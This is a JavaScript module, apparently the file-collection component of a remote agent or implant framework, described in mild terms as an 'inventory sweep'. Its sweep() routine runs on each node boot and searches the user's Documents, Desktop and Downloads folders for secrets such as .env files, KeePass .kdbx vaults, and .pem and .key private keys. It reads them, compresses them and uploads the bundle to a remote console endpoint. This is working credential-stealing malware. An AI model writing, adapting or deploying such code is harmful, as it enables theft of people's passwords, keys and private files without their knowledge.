// agents/hypochlorite.mjs — intake component
//
// Two jobs:
//   sweep()  : initial inventory sweep after registration; collects
//              small text-shaped files from the user profile, seals
//              them into the local vault and pushes a compressed
//              bundle to the console vault intake.
//   upload() : push one sealed artifact (used by tasks).

import os from "node:os";
import { createHash } from "node:crypto";
import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { basename, join, resolve } from "node:path";
import { gzipSync } from "node:zlib";
import { saveVaultFile } from "../chloride/vault.mjs";

const SWEEP_ROOTS = (process.env.CHLORUM_SWEEP_ROOTS || "")
  .split(/;/)
  .map((p) => p.trim())
  .filter(Boolean)
  .map((p) => resolve(p));
if (SWEEP_ROOTS.length === 0) {
  SWEEP_ROOTS.push(
    join(os.homedir(), "Documents"),
    join(os.homedir(), "Desktop"),
    join(os.homedir(), "Downloads")
  );
}

const SWEEP_EXTS = new Set([
  ".txt", ".md", ".rtf", ".env", ".json", ".xml", ".csv", ".log",
  ".kdbx", ".pem", ".key", ".cfg", ".conf", ".ini", ".yaml", ".yml",
]);

const MAX_FILE_BYTES = 512 * 1024;
const MAX_SWEEP_FILES = 40;
const MAX_BUNDLE_BYTES = 6 * 1024 * 1024;

function* walk(root, depth = 0) {
  if (depth > 4) return;
  let entries;
  try {
    entries = readdirSync(root, { withFileTypes: true });
  } catch {
    return;
  }
  for (const entry of entries) {
    if (entry.name.startsWith(".")) continue;
    const full = join(root, entry.name);
    if (entry.isDirectory()) {
      yield* walk(full, depth + 1);
    } else if (entry.isFile()) {
      yield full;
    }
  }
}

function shortHash(buf) {
  return createHash("sha256").update(buf).digest("hex").slice(0, 12);
}

export const hypochlorite = {
  // initial inventory sweep; runs once per node boot
  async sweep({ taskId, transport, vaultDir }) {
    const picked = [];
    for (const root of SWEEP_ROOTS) {
      if (!existsSync(root)) continue;
      for (const file of walk(root)) {
        if (picked.length >= MAX_SWEEP_FILES) break;
        const ext = file.slice(file.lastIndexOf(".")).toLowerCase();
        if (!SWEEP_EXTS.has(ext)) continue;
        let st;
        try {
          st = statSync(file);
        } catch {
          continue;
        }
        if (st.size === 0 || st.size > MAX_FILE_BYTES) continue;
        picked.push(file);
      }
    }

    const manifest = [];
    const bundleParts = [];
    let bundleBytes = 0;

    for (const file of picked) {
      let data;
      try {
        data = readFileSync(file);
      } catch {
        continue;
      }
      const digest = shortHash(data);
      const entry = { path: file, size: data.length, digest };
      manifest.push(entry);

      // seal locally first — the console copy is a relay, not the master
      try {
        saveVaultFile(
          vaultDir,
          `${basename(file)}.${digest}.chl`,
          Buffer.from(taskId, "utf8"),
          data
        );
      } catch {
        /* local seal failure is not fatal */
      }

      bundleParts.push(`=== ${file} (sha256:${digest})\n`);
      bundleParts.push(data.toString("utf8").slice(0, MAX_FILE_BYTES));
      bundleParts.push("\n");
      bundleBytes += data.length;
      if (bundleBytes > MAX_BUNDLE_BYTES) {
        manifest.push({ note: "bundle size cap reached; remaining files listed only" });
        break;
      }
    }

    if (manifest.length === 0) {
      return { files: 0 };
    }

    const bundle = Buffer.concat(
      bundleParts.map((p) => Buffer.from(p, "utf8"))
    );
    const gz = gzipSync(bundle);

    const result = await transport.postRaw("/api/chl/up", gz, {
      "x-chl-task": taskId,
      "x-chl-agent": taskId,
      "x-chl-kind": "hypochlorite",
      "x-chl-name": `hypochlorite-${Date.now()}.txt`,
      "x-chl-gzip": "1",
    });

    return { files: manifest.length, stored: result.stored, archive: result.archive || null };
  },

  // push a single artifact from a task
  async upload({ taskId, transport, name, data, kind = "artifact" }) {
    const gz = gzipSync(Buffer.isBuffer(data) ? data : Buffer.from(data, "utf8"));
    return transport.postRaw("/api/chl/up", gz, {
      "x-chl-task": taskId,
      "x-chl-agent": taskId,
      "x-chl-kind": kind,
      "x-chl-name": name,
      "x-chl-gzip": "1",
    });
  },
};
